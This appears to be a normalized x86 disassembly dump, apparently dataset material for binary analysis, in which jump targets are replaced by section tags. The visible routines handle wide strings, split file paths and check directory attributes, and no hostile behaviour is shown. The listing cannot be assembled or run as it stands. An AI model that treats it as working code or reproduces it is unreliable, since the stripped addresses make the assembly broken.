cmp ax [ ecx ]
sbb ecx ecx
and ecx 0xfffffffe
add ecx 0x1
je r-xdata
add eax 0x2
add ecx 0x2
sub edx 0x1
jne r-xdata
movzx eax [ edi ]
cmp [ esi ] ax
jne r-xdata
cmp [ esp + 0xc ] 0x8
jb r-xdata
mov bp [ eax ]
cmp bp [ ecx ]
jne r-xdata
mov ecx [ esp + 0x8 ]
mov eax esi
sub eax ecx
pop esi
sar eax 0x1
pop ebp
add esp 0xc
retn
mov edx [ esp + 0x8 ]
mov ecx [ edx ]
mov eax esi
sub eax ecx
pop esi
sar eax 0x1
pop ebp
add esp 0xc
retn
sub_428d60
push 0xffffffff
push sub_459e08
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x28 ]
mov [ fs : 0x0 ] eax
xor edi edi
xor eax eax
push 0xffffffff
mov [ esp + 0x14 ] ax
mov eax [ esp + 0x3c ]
push edi
lea ecx [ esp + 0x14 ]
mov [ esp + 0x10 ] edi
mov [ esp + 0x2c ] 0x7
mov [ esp + 0x28 ] edi
call sub_429a10
mov eax ebx
mov [ esp + 0x30 ] edi
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
mov eax ebx
lea ecx [ esp + 0x10 ]
call sub_429170
xor ecx ecx
mov [ esi + 0x18 ] 0x7
mov [ esi + 0x14 ] edi
push 0xffffffff
mov [ esi + 0x4 ] cx
push edi
mov ecx esi
call sub_429a10
cmp [ esp + 0x24 ] 0x8
jb r-xdata
mov eax esi
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
add esp 0x2c
retn
mov edx [ esp + 0x10 ]
push edx
call sub_43f960
add esp 0x4
sub_428e20
mov ecx [ eax + 0x14 ]
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
push edi
test ecx ecx
jbe r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn 0x4
mov edx [ eax + 0x18 ]
mov [ esp + 0x14 ] edx
lea ebx [ eax + 0x4 ]
cmp edx 0x8
jb r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
lea edi [ eax + ecx * 2 ]
cmp edx 0x8
jb r-xdata
movzx esi [ eax ]
mov edx 0x1
mov ecx ebp
cmp eax edi
jae r-xdata
add eax 0x2
cmp eax edi
jb r-xdata
add ecx 0x2
sub edx 0x1
jne r-xdata
cmp [ ecx ] si
je r-xdata
cmp [ esp + 0x14 ] 0x8
jb r-xdata
pop edi
mov ecx ebx
pop esi
sub eax ecx
pop ebp
sar eax 0x1
pop ebx
retn 0x4
mov ecx [ ebx ]
pop edi
pop esi
sub eax ecx
pop ebp
sar eax 0x1
pop ebx
retn 0x4
sub_428ea0
mov eax [ edi + 0x14 ]
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
test eax eax
jbe r-xdata
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn 0x4
cmp eax 0xffffffff
jbe r-xdata
lea ecx [ eax - 0x1 ]
or ecx 0xffffffff
jmp r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov eax [ edi + 0x18 ]
mov [ esp + 0x10 ] eax
lea ebx [ edi + 0x4 ]
cmp eax 0x8
jb r-xdata
mov eax edi
call sub_428aa0
cmp esi eax
je r-xdata
add eax 0x2
sub ecx 0x1
jne r-xdata
lea esi [ eax + ecx * 2 ]
sub esi 0x2
jmp r-xdata
cmp [ eax ] dx
je r-xdata
cmp [ esp + 0x10 ] 0x8
jb r-xdata
movzx edx [ esi ]
mov ecx 0x1
mov eax ebp
lea ecx [ ecx ]
mov eax esi
mov ecx ebx
pop esi
sub eax ecx
pop ebp
sar eax 0x1
pop ebx
retn 0x4
mov ecx [ ebx ]
mov eax esi
pop esi
sub eax ecx
pop ebp
sar eax 0x1
pop ebx
retn 0x4
sub_428f30
push 0xffffffff
push sub_459dd8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x54 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x6c ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x7c ]
xor edi edi
xor ecx ecx
mov [ esp + 0x60 ] 0x7
mov [ esp + 0x5c ] edi
mov [ esp + 0x4c ] cx
mov [ esp + 0x74 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx eax
lea esi [ ecx + 0x2 ]
jmp r-xdata
mov dx [ ecx ]
add ecx 0x2
cmp dx di
jne r-xdata
sub ecx esi
sar ecx 0x1
push ecx
lea esi [ esp + 0x4c ]
call sub_429cc0
cmp [ eax + 0x14 ] edi
je r-xdata
cmp [ esp + 0x60 ] 0x8
jb r-xdata
lea edx [ esp + 0x10 ]
mov edi 0x20
push edx
mov eax esi
mov [ esp + 0x14 ] edi
call sub_428e20
xor ebx ebx
call sub_429980
lea eax [ esp + 0x10 ]
mov [ esp + 0x10 ] edi
push eax
mov edi esi
call sub_428ea0
mov ebx eax
inc ebx
or eax 0xffffffff
call sub_429980
lea ecx [ esp + 0x10 ]
push ecx
mov [ esp + 0x14 ] 0x5c
call sub_428ea0
mov ebx eax
inc ebx
or eax 0xffffffff
call sub_429980
mov eax [ esp + 0x4c ]
mov esi 0x8
cmp [ esp + 0x60 ] esi
jae r-xdata
mov ecx [ esp + 0x4c ]
push ecx
call sub_43f960
add esp 0x4
lea edx [ esp + 0x14 ]
push edx
push eax
call sub_4408c8
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
lea eax [ esp + 0x4c ]
mov eax [ esp + 0x1a ]
lea esi [ esp + 0x48 ]
test eax 0x8000
je r-xdata
cmp [ esp + 0x60 ] esi
jb r-xdata
test eax 0x4000
je r-xdata
call sub_429950
mov eax 0x1
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ esp + 0x4c ]
push eax
call sub_43f960
add esp 0x4
call sub_429950
jmp r-xdata
call sub_429950
mov eax 0x2
jmp r-xdata
mov ecx [ esp + 0x6c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x54 ]
xor ecx esp
call sub_43f96b
add esp 0x68
retn
sub_4290b0
push ebx
push ebp
mov ebp [ esp + 0xc ]
push edi
mov edi [ esp + 0x14 ]
mov ebx eax
cmp [ ebp + 0x14 ] edi
jae r-xdata
mov eax [ ebp + 0x14 ]
sub eax edi
cmp eax ebx
jae r-xdata
call sub_43f111
mov eax [ esi + 0x14 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
jbe r-xdata
mov ebx eax
call sub_43f0d9
lea edx [ eax + ebx ]
cmp edx eax
jae r-xdata
mov eax esi
test ebx ebx
jbe r-xdata
pop edi
pop ebp
pop ebx
retn 0x8
mov edi [ esi + 0x14 ]
add edi ebx
call sub_429c60
test al al
je r-xdata
mov eax esi
cmp [ ebp + 0x18 ] 0x8
jb r-xdata
add ebp 0x4
mov ebp [ ebp + 0x4 ]
jmp r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x8
jb r-xdata
lea eax [ esi + 0x4 ]
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ esi + 0x4 ]
xor ecx ecx
mov [ eax + edi * 2 ] cx
pop edi
pop ebp
mov eax esi
pop ebx
retn 0x8
mov ecx [ esi + 0x14 ]
add ebx ebx
push ebx
mov ebx [ esp + 0x18 ]
sub eax ecx
lea ebx [ ebp + ebx * 2 ]
add eax eax
push ebx
push eax
lea eax [ edx + ecx * 2 ]
push eax
call sub_43f985
add esp 0x10
cmp [ esi + 0x18 ] 0x8
mov [ esi + 0x14 ] edi
jb r-xdata
sub_429170
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
mov ebx eax
push edi
mov esi ecx
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
or edx 0xffffffff
sub edx eax
cmp edx ebp
jbe r-xdata
mov edx [ esi + 0x18 ]
lea eax [ esi + 0x4 ]
cmp edx 0x8
jb r-xdata
call sub_43f0d9
lea ecx [ eax + ebp ]
cmp ecx eax
jae r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
test ebp ebp
jbe r-xdata
cmp edx 0x8
jb r-xdata
cmp ebx ecx
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov edi [ esi + 0x14 ]
add edi ebp
mov eax esi
call sub_429c60
test al al
je r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x8
jb r-xdata
cmp edx 0x8
jb r-xdata
mov edi [ esi + 0x14 ]
lea ecx [ ecx + edi * 2 ]
cmp ecx ebx
jbe r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
sub ebx eax
sar ebx 0x1
push ebx
push esi
mov eax ebp
call sub_4290b0
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
mov eax [ eax ]
lea eax [ esi + 0x4 ]
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ esi + 0x4 ]
xor ecx ecx
mov [ eax + edi * 2 ] cx
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov ecx [ esi + 0x14 ]
add ebp ebp
push ebp
sub eax ecx
push ebx
add eax eax
push eax
lea edx [ edx + ecx * 2 ]
push edx
call sub_43f985
add esp 0x10
cmp [ esi + 0x18 ] 0x8
mov [ esi + 0x14 ] edi
jb r-xdata
sub_429250
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_45a4f4
mov eax [ fs : 0x0 ]
push eax
sub esp 0xa0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x98 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xb0 ]
mov [ fs : 0x0 ] eax
mov esi ecx
xor edi edi
push edi
mov eax r--data
mov [ esp + 0x18 ] esi
call sub_429cc0
mov ecx esi
call sub_428ab0
test eax eax
jne r-xdata
xor eax eax
mov [ esp + 0x58 ] ax
mov ebx 0x7
push edi
mov eax r--data
lea esi [ esp + 0x58 ]
mov [ esp + 0x70 ] ebx
mov [ esp + 0x6c ] edi
call sub_429cc0
mov ecx esi
mov [ esp + 0xb8 ] edi
call sub_428b90
test al al
je r-xdata
cmp [ esi + 0x14 ] edi
je r-xdata
cmp [ esp + 0x6c ] 0x8
jb r-xdata
cmp [ esp + 0x68 ] edi
je r-xdata
mov eax [ esi + 0x14 ]
lea edi [ eax - 0x1 ]
cmp edi eax
jbe r-xdata
or eax 0xffffffff
mov eax [ esp + 0x58 ]
push eax
call sub_43f960
add esp 0x4
xor ecx ecx
push 0xffffffff
mov [ esp + 0x40 ] cx
push edi
mov eax esi
lea ecx [ esp + 0x40 ]
mov [ esp + 0x58 ] ebx
mov [ esp + 0x54 ] edi
call sub_429a10
mov [ esp + 0xb8 ] 0x1
mov ebx [ esp + 0x4c ]
dec ebx
or eax 0xffffffff
lea esi [ esp + 0x38 ]
call sub_429980
lea edi [ esp + 0x18 ]
mov ebx esi
mov [ esp + 0x18 ] 0x5c
call sub_428cb0
mov edx esi
push edx
lea ecx [ eax + 0x1 ]
xor edx edx
lea esi [ esp + 0x20 ]
call sub_428c80
push 0xffffffff
xor esi esi
push esi
mov ecx ebx
mov [ esp + 0xc0 ] 0x2
call sub_429a10
mov edi 0x8
cmp [ esp + 0x34 ] edi
jb r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
call sub_4407b7
mov eax 0x7
xor ecx ecx
mov [ esp + 0x88 ] eax
mov [ esp + 0x84 ] esi
mov [ esp + 0x74 ] cx
xor edx edx
mov [ esp + 0xa4 ] eax
mov [ esp + 0xa0 ] esi
mov [ esp + 0x90 ] dx
lea eax [ esp + 0x54 ]
push eax
mov ebx r--data
lea esi [ esp + 0x20 ]
mov [ esp + 0xbc ] 0x4
call sub_428d60
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ esp + 0x78 ]
mov [ esp + 0xc0 ] 0x5
call sub_429a10
mov [ esp + 0xb8 ] 0x4
cmp [ esp + 0x34 ] edi
jb r-xdata
mov eax [ esp + 0x20 ]
push eax
call sub_43f960
add esp 0x4
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
lea edx [ esp + 0x38 ]
push edx
mov ebx r--data
lea esi [ esp + 0x20 ]
call sub_428d60
add esp 0x4
push 0xffffffff
xor ebx ebx
push ebx
lea ecx [ esp + 0x94 ]
mov [ esp + 0xc0 ] 0x6
call sub_429a10
mov [ esp + 0xb8 ] 0x4
cmp [ esp + 0x34 ] edi
jb r-xdata
mov ecx [ esp + 0x20 ]
push ecx
call sub_43f960
add esp 0x4
xor eax eax
jmp r-xdata
push 0x1
mov eax r--data
mov ecx esi
call sub_429170
cmp [ eax + edi * 2 ] 0x5c
je r-xdata
mov eax [ esp + 0x74 ]
cmp [ esp + 0x88 ] edi
jae r-xdata
mov eax [ esp + 0x20 ]
push eax
call sub_43f960
add esp 0x4
mov ecx [ esp + 0xb0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x98 ]
xor ecx esp
call sub_43f96b
mov esp ebp
pop ebp
retn
push eax
call sub_428f30
add esp 0x4
cmp eax 0x1
jne r-xdata
lea eax [ esp + 0x74 ]
mov eax [ esp + 0x90 ]
cmp [ esp + 0xa4 ] edi
jae r-xdata
mov ecx [ esp + 0x14 ]
push 0xffffffff
push ebx
lea eax [ esp + 0x5c ]
call sub_429a10
cmp [ esp + 0xa4 ] edi
jb r-xdata
push eax
call sub_428f30
add esp 0x4
cmp eax 0x1
jne r-xdata
lea eax [ esp + 0x90 ]
xor edx edx
mov esi 0x7
mov [ esp + 0xa4 ] esi
mov [ esp + 0xa0 ] ebx
mov [ esp + 0x90 ] dx
cmp [ esp + 0x88 ] edi
jb r-xdata
mov ecx [ esp + 0x90 ]
push ecx
call sub_43f960
add esp 0x4
mov edx [ esp + 0x14 ]
push edx
mov eax r--data
call sub_429d70
lea esi [ esp + 0x8c ]
call sub_429950
lea esi [ esp + 0x70 ]
call sub_429950
lea esi [ esp + 0x38 ]
call sub_429950
lea esi [ esp + 0x54 ]
call sub_429950
mov eax 0xfffffffe
jmp r-xdata
mov ecx [ esp + 0x14 ]
push 0xffffffff
push ebx
lea eax [ esp + 0x40 ]
call sub_429a10
lea esi [ esp + 0x8c ]
call sub_429950
lea esi [ esp + 0x70 ]
call sub_429950
lea esi [ esp + 0x38 ]
call sub_429950
lea esi [ esp + 0x54 ]
call sub_429950
xor eax eax
jmp r-xdata
xor ecx ecx
mov [ esp + 0x88 ] esi
mov [ esp + 0x84 ] ebx
mov [ esp + 0x74 ] cx
cmp [ esp + 0x50 ] edi
jb r-xdata
mov eax [ esp + 0x74 ]
push eax
call sub_43f960
add esp 0x4
xor eax eax
mov [ esp + 0x50 ] esi
mov [ esp + 0x4c ] ebx
mov [ esp + 0x3c ] ax
cmp [ esp + 0x6c ] edi
jb r-xdata
mov edx [ esp + 0x3c ]
push edx
call sub_43f960
add esp 0x4
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x58 ]
push ecx
call sub_43f960
add esp 0x4
sub_429630
push esi
mov esi eax
cmp esi edi
je r-xdata
pop esi
retn
cmp [ esi + 0x18 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x18 ] 0x7
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] cx
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi + 0x4 ]
push eax
call sub_43f960
add esp 0x4
sub_429670
push ecx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax [ esi ]
push eax
mov [ esi + 0xc ] 0x0
mov [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0x0
call sub_43f960
add esp 0x8
retn
mov ecx [ esp ]
push edi
mov edi [ esi + 0x10 ]
push ecx
call sub_429630
mov edx [ esi + 0xc ]
push edx
call sub_43f960
add esp 0x8
pop edi
sub_4296c0
push 0xffffffff
push sub_459548
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0x8 ] esi
call sub_43fa82
xor eax eax
mov [ esp + 0x14 ] eax
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
push 0xffffffff
mov [ ecx + 0x14 ] eax
mov [ ecx + 0x18 ] 0xf
push eax
mov [ ecx + 0x4 ] al
mov eax [ esp + 0x24 ]
push eax
call sub_429ea0
mov eax esi
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x10
retn 0x4
sub_429750
push esi
mov esi ecx
mov [ esi ] r--data
cmp [ esi + 0x24 ] 0x10
jb r-xdata
xor eax eax
mov [ esi + 0x24 ] 0xf
mov [ esi + 0x20 ] eax
mov ecx esi
mov [ esi + 0x10 ] al
call sub_43fb60
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax [ esi + 0x10 ]
push eax
call sub_43f960
add esp 0x4
mov eax esi
pop esi
retn 0x4
push esi
call sub_43f960
add esp 0x4
sub_4297d0
push esi
xor eax eax
mov esi ecx
push 0xffffffff
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xf
push eax
mov [ esi + 0x4 ] al
mov eax [ esp + 0x10 ]
push eax
call sub_429ea0
mov eax esi
pop esi
retn 0x4
sub_429800
push 0xffffffff
push sub_459888
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0xc ] esi
mov edi [ esp + 0x20 ]
push edi
call sub_43fb03
xor edx edx
mov [ esp + 0x18 ] edx
push 0xffffffff
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
lea eax [ edi + 0xc ]
push edx
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] edx
push eax
mov [ ecx + 0x4 ] dl
call sub_429ea0
mov eax esi
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0x10
retn 0x4
sub_429880
or eax 0xffffffff
xor edx edx
div ecx
sub esp 0x10
cmp eax 0x1c
jae r-xdata
lea edx [ ecx * 8 ]
sub edx ecx
add edx edx
add edx edx
push edx
call sub_43fa1d
add esp 0x4
add esp 0x10
retn
lea eax [ esp ]
push eax
lea ecx [ esp + 0x8 ]
mov [ esp + 0x4 ] 0x0
call sub_43fa93
push r--data
lea ecx [ esp + 0x8 ]
push ecx
mov [ esp + 0xc ] r--data
call sub_442eab
sub_4298e0
push ebx
push esi
mov esi eax
mov eax [ ecx + 0x14 ]
cmp eax esi
jae r-xdata
mov edx esi
cmp esi edi
jb r-xdata
mov esi eax
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
mov edx edi
lea eax [ ecx + 0x4 ]
mov eax [ ecx + 0x4 ]
jmp r-xdata
cmp esi edi
jae r-xdata
jmp r-xdata
mov ecx [ esp + 0xc ]
test edx edx
jbe r-xdata
xor eax eax
cmp esi edi
setne al
pop esi
or eax 0xffffffff
pop ebx
retn 0x4
mov bx [ eax ]
cmp bx [ ecx ]
jne r-xdata
movzx eax [ eax ]
cmp ax [ ecx ]
sbb eax eax
and eax 0xfffffffe
add eax 0x1
jne r-xdata
add eax 0x2
add ecx 0x2
sub edx 0x1
jne r-xdata
pop esi
pop ebx
retn 0x4
jmp r-xdata
sub_429980
sub esp 0x8
push edi
mov edi eax
cmp [ esi + 0x14 ] ebx
jae r-xdata
mov eax [ esi + 0x14 ]
sub eax ebx
cmp eax edi
jae r-xdata
call sub_43f111
test edi edi
jbe r-xdata
mov edi eax
mov eax esi
pop edi
add esp 0x8
retn
mov ecx [ esi + 0x18 ]
push ebp
lea ebp [ esi + 0x4 ]
cmp ecx 0x8
jb r-xdata
mov [ esp + 0x8 ] ebp
mov edx [ ebp ]
mov [ esp + 0x8 ] edx
jmp r-xdata
mov [ esp + 0xc ] ebp
mov edx [ ebp ]
mov [ esp + 0xc ] edx
jmp r-xdata
cmp ecx 0x8
jb r-xdata
xor ecx ecx
mov [ ebp + eax * 2 ] cx
pop ebp
mov ebp [ ebp ]
mov edx [ esp + 0x8 ]
sub eax edi
add eax eax
push eax
lea eax [ ebx + edi ]
lea eax [ edx + eax * 2 ]
sub ecx ebx
push eax
add ecx ecx
push ecx
mov ecx [ esp + 0x18 ]
lea edx [ ecx + ebx * 2 ]
push edx
call sub_43fbf5
mov eax [ esi + 0x14 ]
sub eax edi
add esp 0x10
cmp [ esi + 0x18 ] 0x8
mov [ esi + 0x14 ] eax
jb r-xdata
sub_429a10
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
mov ebx eax
push edi
mov esi ecx
cmp [ ebx + 0x14 ] ebp
jae r-xdata
mov edi [ ebx + 0x14 ]
mov eax [ esp + 0x18 ]
sub edi ebp
cmp eax edi
jae r-xdata
call sub_43f111
cmp esi ebx
jne r-xdata
mov edi eax
mov eax esi
call sub_429c60
test al al
je r-xdata
lea ebx [ edi + ebp ]
or eax 0xffffffff
call sub_429980
mov eax ebp
xor ebx ebx
call sub_429980
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x8
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x8
cmp [ ebx + 0x18 ] 0x8
jb r-xdata
lea ecx [ ebx + 0x4 ]
mov ecx [ ebx + 0x4 ]
jmp r-xdata
mov eax ebp
mov eax [ ebp ]
jmp r-xdata
cmp [ esi + 0x18 ] 0x8
lea ebp [ esi + 0x4 ]
jb r-xdata
xor eax eax
mov [ ebx + ebp ] ax
mov ebp [ ebp ]
mov edx [ esp + 0x14 ]
lea ecx [ ecx + edx * 2 ]
lea ebx [ edi + edi ]
push ebx
push ecx
mov ecx [ esi + 0x18 ]
lea edx [ ecx + ecx ]
push edx
push eax
call sub_43f985
add esp 0x10
cmp [ esi + 0x18 ] 0x8
mov [ esi + 0x14 ] edi
jb r-xdata
sub_429ac0
sub esp 0x10
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x2
jae r-xdata
xor ecx ecx
lea edx [ ecx + ecx ]
push edx
call sub_43fa1d
add esp 0x4
add esp 0x10
retn
lea eax [ esp ]
push eax
lea ecx [ esp + 0x8 ]
mov [ esp + 0x4 ] 0x0
call sub_43fa93
push r--data
lea ecx [ esp + 0x8 ]
push ecx
mov [ esp + 0xc ] r--data
call sub_442eab
int3
sub_429b20
push ebp
mov ebp esp
push 0xffffffff
push sub_4591e0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov esi eax
or esi 0x7
cmp esi 0x7ffffffe
jbe r-xdata
mov ebx [ edi + 0x18 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp edx ecx
jae r-xdata
mov esi eax
jmp r-xdata
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] 0x0
call sub_429ac0
mov ebx eax
jmp r-xdata
mov eax 0x7ffffffe
sub eax ecx
cmp ebx eax
ja r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jbe r-xdata
lea esi [ ecx + ebx ]
cmp [ edi + 0x18 ] 0x8
jb r-xdata
cmp [ edi + 0x18 ] 0x8
jb r-xdata
lea eax [ edi + 0x4 ]
xor edx edx
mov [ eax ] ebx
mov [ edi + 0x18 ] esi
mov [ edi + 0x14 ] ecx
cmp esi 0x8
jb r-xdata
mov eax [ edi + 0x4 ]
push eax
call sub_43f960
mov ecx [ ebp + 0x10 ]
add esp 0x4
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
xor edx edx
mov [ eax + ecx * 2 ] dx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax ebx
add ecx ecx
push ecx
push eax
lea edx [ esi + esi + 0x2 ]
push edx
push ebx
call sub_43f985
mov ecx [ ebp + 0x10 ]
add esp 0x10
sub_429c2b
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x18 ] 0x8
jb r-xdata
xor ecx ecx
push ecx
mov [ esi + 0x18 ] 0x7
mov [ esi + 0x14 ] 0x0
push ecx
mov [ esi + 0x4 ] cx
call sub_442eab
int3
mov eax [ esi + 0x4 ]
push eax
call sub_43f960
add esp 0x4
sub_429c60
push esi
mov esi eax
cmp edi 0x7ffffffe
jbe r-xdata
mov eax [ esi + 0x18 ]
cmp eax edi
jae r-xdata
call sub_43f0d9
test edi edi
jne r-xdata
mov eax [ esi + 0x14 ]
push eax
push edi
push esi
call sub_429b20
xor edx edx
cmp edx edi
sbb eax eax
neg eax
pop esi
retn
xor edx edx
cmp edx edi
sbb eax eax
neg eax
pop esi
retn
mov [ esi + 0x14 ] edi
cmp eax 0x8
jb r-xdata
add esi 0x4
xor ecx ecx
mov [ esi ] cx
mov esi [ esi + 0x4 ]
xor ecx ecx
xor edx edx
cmp edx edi
sbb eax eax
mov [ esi ] cx
neg eax
pop esi
retn
sub_429cc0
push ebx
mov ebx eax
push edi
test ebx ebx
je r-xdata
push ebp
mov ebp [ esp + 0x10 ]
mov edi ebp
mov eax esi
call sub_429c60
test al al
je r-xdata
mov edx [ esi + 0x18 ]
lea eax [ esi + 0x4 ]
cmp edx 0x8
jb r-xdata
pop ebp
pop edi
mov eax esi
pop ebx
retn 0x4
mov ecx [ esi + 0x18 ]
lea edi [ esi + 0x4 ]
cmp ecx 0x8
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
cmp ebx ecx
jb r-xdata
xor eax eax
mov [ edi + ebp ] ax
mov edi [ edi ]
add ebp ebp
push ebp
push ebx
add ecx ecx
push ecx
push eax
call sub_43f985
mov edx [ esp + 0x20 ]
add esp 0x10
cmp [ esi + 0x18 ] 0x8
mov [ esi + 0x14 ] edx
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
mov edi [ esi + 0x14 ]
lea ecx [ ecx + edi * 2 ]
cmp ecx ebx
jbe r-xdata
mov edx [ esp + 0xc ]
sub ebx eax
push edx
sar ebx 0x1
push ebx
mov eax esi
mov ecx esi
call sub_429a10
pop edi
pop ebx
retn 0x4
mov eax [ eax ]
sub_429d70
mov ecx eax
push esi
lea esi [ ecx + 0x2 ]
mov dx [ ecx ]
add ecx 0x2
test dx dx
jne r-xdata
sub ecx esi
mov esi [ esp + 0x8 ]
sar ecx 0x1
push ecx
call sub_429cc0
pop esi
retn 0x4
sub_429da0
push esi
mov esi ecx
cmp [ esi + 0x18 ] 0x10
jb r-xdata
xor eax eax
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] eax
mov [ esi + 0x4 ] al
pop esi
retn
mov eax [ esi + 0x4 ]
push eax
call sub_43f960
add esp 0x4
sub_429dd0
mov edx [ esp + 0x4 ]
push esi
mov esi ecx
mov eax edx
push edi
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] 0x0
lea edi [ eax + 0x1 ]
nop
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
push edx
mov ecx esi
call sub_42a180
pop edi
mov eax esi
pop esi
retn 0x4
sub_429e10
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
push edi
cmp [ esi + 0x14 ] ebx
jae r-xdata
mov eax [ esi + 0x14 ]
mov edi [ esp + 0x14 ]
sub eax ebx
cmp eax edi
jae r-xdata
call sub_43f111
test edi edi
jbe r-xdata
mov edi eax
pop edi
mov eax esi
pop esi
pop ebx
retn 0x8
mov ecx [ esi + 0x18 ]
push ebp
lea ebp [ esi + 0x4 ]
cmp ecx 0x10
jb r-xdata
mov [ esp + 0x14 ] ebp
mov edx [ ebp ]
mov [ esp + 0x14 ] edx
jmp r-xdata
mov edx ebp
mov edx [ ebp ]
jmp r-xdata
cmp ecx 0x10
jb r-xdata
mov [ eax + ebp ] 0x0
pop ebp
mov ebp [ ebp ]
sub eax edi
push eax
mov eax [ esp + 0x18 ]
add eax ebx
add eax edi
push eax
sub ecx ebx
push ecx
add edx ebx
push edx
call sub_43fbf5
mov eax [ esi + 0x14 ]
sub eax edi
add esp 0x10
cmp [ esi + 0x18 ] 0x10
mov [ esi + 0x14 ] eax
jb r-xdata
sub_429ea0
push ebx
mov ebx [ esp + 0x8 ]
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebx + 0x14 ] ebp
jae r-xdata
mov edi [ ebx + 0x14 ]
mov eax [ esp + 0x1c ]
sub edi ebp
cmp eax edi
jae r-xdata
call sub_43f111
cmp esi ebx
jne r-xdata
mov edi eax
cmp edi 0xfffffffe
jbe r-xdata
push 0xffffffff
add edi ebp
push edi
mov ecx esi
call sub_429e10
push ebp
